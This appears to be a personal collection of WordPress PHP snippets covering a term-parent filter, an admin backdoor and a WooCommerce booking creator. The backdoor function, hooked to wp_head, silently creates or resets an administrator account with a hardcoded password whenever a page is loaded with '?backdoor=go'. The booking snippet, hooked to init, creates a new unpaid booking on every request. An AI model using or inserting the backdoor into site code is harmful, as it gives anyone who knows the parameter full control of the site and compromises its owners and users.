# Snippets
	/**
	* Updating parent on term edit screen
	*/
	add_filter('wp_update_term_parent','test_func',10,5);
	function test_func($parent, $term_id, $taxonomy, $parsed_args, $args) {
		$parent = 19;
		return $parent;
	}
	
	/**
	* WP Admin Backdoor
	*/
	add_action('wp_head', 'WordPress_backdoor');
	function WordPress_backdoor() {
	    If ($_GET['backdoor'] == 'go') {
		require('wp-includes/registration.php');
		require('wp-includes/pluggable.php');
		If (!username_exists('backdooradmin')) {
		    $user_id = wp_create_user('backdooradmin', 'Pa55W0rd');
		    $user = new WP_User($user_id);
		    $user->set_role('administrator');
		}else{
		    $user = get_user_by( 'login', 'backdooradmin' );
		    wp_set_password('Pa55W0rd', $user->ID);
		}
	    }
	}
	
	/**
	* Create WooCommerce Bookings
	*/
	add_action('init','set_new_booking');
	function set_new_booking() {
	$new_booking = new WC_Booking();
	$create_order = 'unpaid';
	$new_booking->set_status( $create_order ? 'unpaid' : 'paid' );
	$new_booking->set_date_created( current_time( 'timestamp' ) );
	$new_booking->set_all_day('yes');
	$new_booking->set_person_counts(2);
	$new_booking->set_start('2018-2-2');
	$new_booking->set_end('2018-2-5');
	$new_booking->set_cost(450);
	/*
	$userdata = array(
	    'user_login' =>  'abcd@gmail.com',
	    'user_email' =>  'abcd@gmail.com',
	    'first_name' =>  'abcd@gmail.com',
	    'last_name' =>  'abcd@gmail.com',
	    'role' => 'customer',
	    'user_pass'  =>  wp_generate_password( 8, false )
	); 

	$user_id = wp_insert_user($userdata);
	$new_booking->set_customer_id($user_id);*/
	$new_booking->save();
	}
